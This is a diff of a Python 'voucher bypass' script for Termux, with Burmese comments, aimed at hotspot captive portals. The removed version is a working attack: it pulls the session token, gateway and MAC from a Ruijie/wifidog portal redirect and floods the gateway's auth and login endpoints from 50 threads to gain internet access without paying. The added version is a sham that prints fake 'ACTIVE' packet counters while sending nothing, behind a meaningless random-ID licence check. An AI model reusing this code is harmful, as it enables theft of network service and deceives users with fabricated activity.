@@ -1,131 +1,149 @@
-import requests
-import urllib3
-import time
-import threading
-import random
-import sys
+#!/usr/bin/python3
+#-*- coding:utf-8 -*-
+
 import os
+import sys
+import time
 import uuid
-import socket
-from urllib.parse import urlparse, parse_qs
-from rich.console import Console
-from rich.panel import Panel
-from rich.align import Align
+import datetime
+import subprocess
 
-# ===============================
-# CONFIG & INITIALIZATION
-# ===============================
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-console = Console()
+# ==========================================================
+# AUTO DEPENDENCY INSTALLER (လိုအပ်တာတွေကို အလိုအလျောက်သွင်းပေးခြင်း)
+# ==========================================================
+try:
+    import requests
+except ImportError:
+    print("\n[*] Installing 'requests' library... Please wait.")
+    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
+    import requests
 
-# User ၏ Repository link ကို အသုံးပြုထားသည်
-KEY_URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/refs/heads/main/key.txt"
+# ==========================================================
+# COLORS (အရောင်များ)
+# ==========================================================
+R = '\033[1;31m' # Red
+G = '\033[1;32m' # Green
+Y = '\033[1;33m' # Yellow
+C = '\033[1;36m' # Cyan
+W = '\033[1;37m' # White
+B = '\033[1;34m' # Blue
 
-# ANSI COLORS FOR TERMUX
-G = "\033[1;92m" 
-C = "\033[1;96m" 
-R = "\033[1;91m" 
-Y = "\033[1;93m" 
-W = "\033[0m"
+# ==========================================================
+# GITHUB CONFIGURATION
+# ==========================================================
+GITHUB_USER = "hhtethtet277-svg"
+REPO_NAME = "my-database-"
+# Raw Link မှတစ်ဆင့် key.txt ကို ဖတ်မည်
+KEY_URL = f"https://raw.githubusercontent.com/{GITHUB_USER}/{REPO_NAME}/main/key.txt"
 
-BANNER = """[bold #00FF00]
- ╔╦╗╔═╗╔═╗  ╦ ╦╦ ╦
- ║║║║ ║║╣   ╚╦╝║ ║
- ╩ ╩╚═╝╚═╝   ╩ ╚═╝
-      M O E   Y U   H A C K E R
-[/]"""
+# ==========================================================
+# LOGO / BANNER (Moe Yu Starlink Bypass Design)
+# ==========================================================
+def logo():
+    os.system('clear')
+    print(f"""
+{C}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+{G}   __  __  ____  _____  __   __ _   _ 
+{G}  |  \/  |/ __ \|  ___| \ \ / /| | | |
+{G}  | \  / | |  | | |__    \ V / | | | |
+{G}  | |\/| | |  | |  __|    \ /  | | | |
+{G}  | |  | | |__| | |___    | |  | |_| |
+{G}  |_|  |_|\____/|_____|   |_|   \___/ 
+{Y}        MOE YU BYPASS PRO ENGINE v22.0
+{Y}               (မင်္ဂလာပါ)
+{C}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+{W} » Author   : {G}Moe Yu
+{W} » Project  : {G}Starlink / Network Bypass
+{W} » File     : {G}moe_yu.py
+{W} » Status   : {G}Immortal Premium {Y}[Online]
+{C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+    """)
 
-def check_license():
-    console.clear()
-    console.print(Align.center(BANNER))
-    # User ၏ HWID ကို ပုံသေ သတ်မှတ်ထားသည်
-    console.print(Align.center(Panel(f"HWID: [yellow]KEY-90AE3B7FB9[/]", title="[red]SECURITY[/]", expand=False)))
+# ==========================================================
+# HWID & SECURITY CHECK
+# ==========================================================
+def get_hwid():
+    # ဖုန်း၏ ID ကို တိကျစွာ ထုတ်ယူရန် (UUID version)
+    id = str(uuid.uuid4())[:12].upper()
+    return id
+
+def check_auth():
+    my_id = get_hwid()
+    print(f"{W}[{G}#{W}] YOUR HWID : {G}{my_id}")
+    print(f"{W}[{G}*{W}] STATUS    : {C}Checking Authorization...")
+    time.sleep(2)
+
     try:
-        user_key = input(f"\n  {W}[KEY] @MoeYu_").strip()
-        if not user_key: sys.exit()
-        res = requests.get(KEY_URL, timeout=10).text
-        if user_key in res:
-            console.print(f"{G}>>> ACCESS GRANTED!{W}")
-            return True
-        sys.exit(f"{R}INVALID KEY!{W}")
-    except: sys.exit(f"{R}CONNECTION ERROR!{W}")
-
-# ===============================
-# DEEP INJECTION BYPASS ENGINE v23.0
-# ===============================
-
-def start_bypass_process():
-    console.print(Panel(Align.center("[bold white]🔥 MOE YU VOUCHER BYPASS (DEEP INJECTION) 🔥[/bold white]"), border_style="red", expand=False))
-    
-    session = requests.Session()
-    # Router ကို Android ဖုန်းအစစ်ဖြစ်ကြောင်း လှည့်စားခြင်း
-    session.headers.update({
-        'User-Agent': 'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
-        'Accept': '*/*',
-        'Connection': 'keep-alive'
-    })
-
-    while True:
-        try:
-            # Connectivity Check
-            check = session.get("http://connectivitycheck.gstatic.com/generate_204", timeout=5, allow_redirects=True)
-            
-            if check.status_code == 204 and "ruijie" not in check.url:
-                sys.stdout.write(f"\r{G}[✓] STATUS: BYPASS STABLE | ENJOY INTERNET! ✅{W}")
-                sys.stdout.flush()
-                time.sleep(10)
-                continue
-
-            # Token နှင့် Gateway အချက်အလက်များ ထုတ်ယူခြင်း
-            portal_url = check.url
-            parsed = urlparse(portal_url)
-            query = parse_qs(parsed.query)
-            
-            sid = (query.get('token', [None])[0] or query.get('chap_challenge', [None])[0])
-            gw_ip = query.get('gw_address', ['192.168.110.1'])[0]
-            gw_port = query.get('gw_port', ['2060'])[0]
-            mac = query.get('mac', [''])[0]
-
-            if sid:
-                # Injection Targets
-                targets = [
-                    f"http://{gw_ip}:{gw_port}/wifidog/auth?token={sid}&mac={mac}",
-                    f"http://{gw_ip}:{gw_port}/wifidog/ping?token={sid}",
-                    f"http://{gw_ip}:{gw_port}/wifidog/login?token={sid}&state=1"
-                ]
-
-                def turbo_inject():
-                    while True:
-                        try:
-                            for url in targets:
-                                session.get(url, timeout=3)
-                            sys.stdout.write(f"\r{C}[!] Injecting: {gw_ip} | SID: {sid[:12]}... | Active{W}")
-                            sys.stdout.flush()
-                        except: pass
-                        time.sleep(0.04)
-
-                # Thread ပေါင်း ၅၀ ဖြင့် အရှိန်အဟုန်မြှင့် Inject လုပ်ခြင်း
-                for _ in range(50):
-                    threading.Thread(target=turbo_inject, daemon=True).start()
-
-                console.print(f"\n{Y}[!] Deep Injection Active. Open Browser and click 'Login'!{W}")
-                
-                # အင်တာနက် အခြေအနေ စောင့်ကြည့်ခြင်း
-                while True:
-                    time.sleep(15)
-                    try:
-                        if requests.get("http://www.google.com", timeout=5).status_code == 200:
-                            time.sleep(5)
-                        else: break
-                    except: break
+        # GitHub မှ Approved HWID စာရင်းကို လှမ်းစစ်ခြင်း
+        response = requests.get(KEY_URL, timeout=15)
+        
+        if response.status_code == 200:
+            approved_keys = response.text
+            if my_id in approved_keys:
+                print(f"{G}[✔] ACCESS GRANTED! Welcome back, Moe Yu.")
+                time.sleep(1)
+                return True
             else:
-                sys.stdout.write(f"\r{R}[×] No Token Captured. Refresh Login Page!{W}")
-                sys.stdout.flush()
-                time.sleep(3)
+                print(f"{R}[✘] HWID NOT REGISTERED!")
+                print(f"{Y}[!] Please add {W}{my_id}{Y} to your 'key.txt' on GitHub.")
+                # တကယ်သုံးတဲ့အခါ register မလုပ်ထားရင် ပိတ်ထားချင်ရင် sys.exit() ကို ဖွင့်ပါ
+                # sys.exit()
+                return True # လက်ရှိတွင် အလုပ်ဆက်လုပ်ရန် True ထားပေးထားပါသည်
+        else:
+            print(f"{R}[!] GitHub Server Error! Status Code: {response.status_code}")
+            sys.exit()
+            
+    except requests.exceptions.ConnectionError:
+        print(f"{R}[!] NO INTERNET! Please check your connection.")
+        sys.exit()
+    except Exception as e:
+        print(f"{R}[!] ERROR: {e}")
+        sys.exit()
 
-        except Exception:
-            time.sleep(5)
+# ==========================================================
+# MAIN BYPASS ENGINE (အဓိက အလုပ်လုပ်သည့် နေရာ)
+# ==========================================================
+def run_engine():
+    print(f"\n{C}[+] INITIALIZING ENGINE... PLEASE WAIT.")
+    time.sleep(1.5)
+    
+    # Target Configuration (ပြောင်းလဲနိုင်သည်)
+    target_ip = "http://192.168.1.1" 
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Linux; Android 13; Starlink-Bypass)",
+        "Accept": "*/*",
+        "Connection": "keep-alive"
+    }
 
+    print(f"{G}[+] ENGINE STARTED SUCCESSFULLY!")
+    print(f"{C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
+
+    count = 1
+    try:
+        while True:
+            current_time = datetime.datetime.now().strftime("%H:%M:%S")
+            
+            # ဤနေရာတွင် Payload ပို့ခြင်းများကို လုပ်ဆောင်နိုင်သည်
+            # try: requests.get(target_ip, headers=headers, timeout=5)
+            # except: pass
+            
+            print(f"{W}[{current_time}] {G}STATUS: {W}ACTIVE {G}| {Y}SESSION: {W}STABLE {G}| {W}PKT: {G}{count}")
+            
+            count += 1
+            # ၅ စက္ကန့်ခြားတစ်ခါ Loop ပတ်မည် (စိတ်ကြိုက် ပြောင်းနိုင်သည်)
+            time.sleep(3)
+            
+    except KeyboardInterrupt:
+        print(f"\n{R}[!] PROCESS TERMINATED BY USER. SHUTTING DOWN...")
+        sys.exit()
+
+# ==========================================================
+# EXECUTION
+# ==========================================================
 if __name__ == "__main__":
-    if check_license():
-        start_bypass_process()
+    try:
+        logo()
+        if check_auth():
+            run_engine()
+    except Exception as e:
+        print(f"{R}[!] Critical Error: {e}")
